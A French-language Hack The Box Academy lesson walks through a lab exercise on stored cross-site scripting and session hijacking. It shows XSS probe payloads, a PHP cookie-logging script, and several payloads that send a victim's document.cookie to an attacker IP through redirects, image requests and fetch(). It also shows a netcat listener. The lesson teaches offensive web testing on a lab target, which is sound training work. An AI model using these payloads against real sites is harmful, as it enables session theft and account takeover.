Script intersite (XSS)
======================

* * * * *

Les vulnérabilités de type Cross-Site Scripting (XSS) font partie des vulnérabilités les plus courantes des applications Web. Une vulnérabilité XSS peut permettre à un attaquant d'exécuter du code JavaScript arbitraire dans le navigateur de la cible et entraîner une compromission complète de l'application Web si elle est enchaînée avec d'autres vulnérabilités. Dans cette section, cependant, nous nous concentrerons sur l'exploitation des vulnérabilités de Cross-Site Scripting (XSS) pour obtenir des identifiants de session valides (tels que les cookies de session).

Si vous souhaitez approfondir les vulnérabilités du Cross-Site Scripting (XSS), nous vous suggérons d'étudier notre module [Cross-Site Scripting (XSS) .](https://academy.hackthebox.com/module/details/103)

Pour qu'une attaque de type Cross-Site Scripting (XSS) entraîne une fuite de cookie de session, les conditions suivantes doivent être remplies :

-   Les cookies de session doivent être présents dans toutes les requêtes HTTP
-   Les cookies de session doivent être accessibles par code JavaScript (l'attribut HTTPOnly doit être absent)

Allez à la fin de cette section et cliquez sur `Click here to spawn the target system!`ou sur l' `Reset Target`icône . Utilisez la Pwnbox fournie ou une machine virtuelle locale avec la clé VPN fournie pour atteindre l'application cible et suivez-la. N'oubliez pas de configurer le vhost ( `xss.htb.net`) spécifié pour accéder à l'application.

Accédez `http://xss.htb.net`à l'application et connectez-vous à l'aide des informations d'identification ci-dessous :

-   Courriel : crazygorilla983
-   Mot de passe : poissons

Il s'agit d'un compte que nous avons créé pour examiner les fonctionnalités de l'application. Il semble que nous puissions modifier les champs de saisie pour mettre à jour notre adresse e-mail, notre numéro de téléphone et notre pays.

![image](https://academy.hackthebox.com/storage/modules/153/20.png)

Dans de tels cas, il est préférable d'utiliser des charges utiles avec des gestionnaires d'événements comme `onload`ou `onerror`puisqu'ils se déclenchent automatiquement et prouvent également l'impact le plus élevé sur les cas XSS stockés. Bien sûr, s'ils sont bloqués, vous devrez utiliser autre chose comme `onmouseover`.

Dans un champ, spécifions la charge utile suivante :

Code : javascript

```
"><img src=x onerror=prompt(document.domain)>

```

Nous utilisons `document.domain`pour nous assurer que JavaScript est exécuté sur le domaine réel et non dans un environnement en bac à sable. L'exécution de JavaScript dans un environnement en bac à sable empêche les attaques côté client. Il convient de noter que les échappements de bac à sable existent mais sortent du cadre de ce module.

Dans les deux champs restants, spécifions les deux charges utiles suivantes.

Code : javascript

```
"><img src=x onerror=confirm(1)>

```

Code : javascript

```
"><img src=x onerror=alert(1)>

```

Nous devrons mettre à jour le profil en appuyant sur "Enregistrer" pour soumettre nos charges utiles.

![image](https://academy.hackthebox.com/storage/modules/153/21.png)

Le profil a été mis à jour avec succès. Nous remarquons qu'aucune charge utile n'est déclenchée, cependant! Souvent, le code de charge utile ne sera pas appelé/exécuté tant qu'une autre fonctionnalité de l'application ne le déclenchera pas. Allons à "Partager", car c'est la seule autre fonctionnalité dont nous disposons, pour voir si l'une des charges utiles soumises y est récupérée. Cette fonctionnalité renvoie un profil accessible au public. L'identification d'une vulnérabilité XSS stockée dans une telle fonctionnalité serait idéale du point de vue d'un attaquant.

C'est bien le cas ! La charge utile spécifiée dans le champ *Pays* a été déclenchée !

![image](https://academy.hackthebox.com/storage/modules/153/22.png)

Vérifions maintenant si *HTTPOnly* est "off" en utilisant Web Developer Tools.

![image](https://academy.hackthebox.com/storage/modules/153/23.png)

*HTTPOnly* est désactivé !

* * * * *

Obtention de cookies de session via XSS
---------------------------------------

Nous avons identifié que nous pouvions créer et partager des profils accessibles au public qui contiennent nos charges utiles XSS spécifiées.

Créons un script de journalisation des cookies (enregistrez-le sous `log.php`) pour vous entraîner à obtenir le cookie de session d'une victime en partageant un profil public XSS vulnérable à stocké. Le script PHP ci-dessous peut être hébergé sur un VPS ou sur votre machine attaquante (selon les restrictions de sortie).

Code : php

```
<?php
$logFile = "cookieLog.txt";
$cookie = $_REQUEST["c"];

$handle = fopen($logFile, "a");
fwrite($handle, $cookie . "\n\n");
fclose($handle);

header("Location: http://www.google.com/");
exit;
?>

```

Ce script attend que quelqu'un demande `?c=+document.cookie`, puis il analysera le cookie inclus.

Le script de journalisation des cookies peut être exécuté comme suit. `TUN Adapter IP`est l' `tun`adresse IP de l'interface de Pwnbox ou de votre propre VM.

```
dsgsec@htb[/htb]$ php -S <VPN/TUN Adapter IP>:8000
[Mon Mar  7 10:54:04 2022] PHP 7.4.21 Development Server (http://<VPN/TUN Adapter IP>:8000) started

```

Avant de simuler l'attaque, restaurez l'e-mail et le téléphone d'origine d'Ela Stienen (puisque nous n'avons trouvé aucun XSS dans ces champs et que nous voulons également que le profil ait l'air légitime). Maintenant, plaçons la charge utile ci-dessous dans le champ *Pays* . Il n'y a pas d'exigences spécifiques pour la charge utile ; nous venons d'en utiliser un moins courant et un peu plus avancé, car vous devrez peut-être faire de même à des fins d'évasion.

Charge utile:

Code : javascript

```
<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://<VPN/TUN Adapter IP>:8000/log.php?c=' + document.cookie;"></video>

```

Remarque : Si vous effectuez des tests dans le monde réel, essayez d'utiliser quelque chose comme [XSSHunter](https://xsshunter.com/) , [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) ou [Project Interactsh](https://app.interactsh.com/) . Un serveur PHP par défaut ou Netcat peut ne pas envoyer les données sous la forme correcte lorsque l'application Web cible utilise HTTPS.

Un exemple de charge utile HTTPS>HTTPS peut être trouvé ci-dessous :

Code : javascript

```
<h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>

```

Simuler la victime

Ouvrez un `New Private Window`, accédez `http://xss.htb.net`à l'application et connectez-vous à l'aide des informations d'identification ci-dessous :

-   Courriel : smallfrog576
-   Mot de passe : guitares

Ce compte jouera le rôle de la victime !

Maintenant, accédez à `http://xss.htb.net/profile?email=ela.stienen@example.com`. Il s'agit du profil public conçu par l'attaquant qui héberge notre charge utile de vol de cookies (en tirant parti de la vulnérabilité XSS stockée que nous avons précédemment identifiée).

Vous devriez maintenant voir ci-dessous dans votre machine attaquante.

![image](https://academy.hackthebox.com/storage/modules/153/52.png)

Terminez le serveur PHP avec Ctrl+c, et le cookie de la victime résidera à l'intérieur`cookieLog.txt`

![image](https://academy.hackthebox.com/storage/modules/153/53.png)

Vous pouvez maintenant utiliser ce cookie volé pour détourner la session de la victime !

* * * * *

Obtention de cookies de session via XSS (édition Netcat)
--------------------------------------------------------

Au lieu d'un script de journalisation des cookies, nous aurions également pu utiliser le vénérable outil Netcat.

Essayons cela aussi par souci d'exhaustivité.

Avant de simuler l'attaque, plaçons la charge utile ci-dessous dans le champ *Pays* du profil d'Ela Stienen et cliquez sur "Enregistrer". Il n'y a pas d'exigences spécifiques pour la charge utile. Nous venons d'en utiliser une moins courante et un peu plus avancée, car vous devrez peut-être faire la même chose à des fins d'évasion.

Code : javascript

```
<h1 onmouseover='document.write(`<img src="http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}">`)'>test</h1>

```

Instruisons également Netcat d'écouter sur le port 8000 comme suit.

```
dsgsec@htb[/htb]$ nc -nlvp 8000
listening on [any] 8000 ...

```

Ouvrez un `New Private Window`et accédez à `http://xss.htb.net/profile?email=ela.stienen@example.com`, en simulant ce que ferait la victime. Nous vous rappelons que ce qui précède est un profil public contrôlé par un attaquant hébergeant une charge utile de vol de cookies (exploitant la vulnérabilité XSS stockée que nous avons précédemment identifiée).

Au moment où vous placez votre souris sur "test", vous devriez maintenant voir ci-dessous dans votre machine d'attaque.

![image](https://academy.hackthebox.com/storage/modules/153/54.png)

Veuillez noter que le cookie est une valeur Base64 car nous avons utilisé la `btoa()`fonction, qui encodera en base64 la valeur du cookie. Nous pouvons le décoder à l'aide `atob("b64_string")`de la console de développement des outils de développement Web, comme suit.

![image](https://academy.hackthebox.com/storage/modules/153/55.png)

Vous pouvez maintenant utiliser ce cookie volé pour détourner la session de la victime !

Nous n'avons pas nécessairement besoin d'utiliser l' `window.location()`objet qui redirige les victimes. Nous pouvons utiliser `fetch()`, qui peut récupérer des données (cookies) et les envoyer à notre serveur sans aucune redirection. C'est une manière plus discrète.

Trouvez un exemple d'une telle charge utile ci-dessous.

Code : javascript

```
<script>fetch(`http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}`)</script>

```

Essaie...

Il est temps de passer à une autre attaque de session appelée Cross-Site Request Forgery (CSRF ou XSRF).
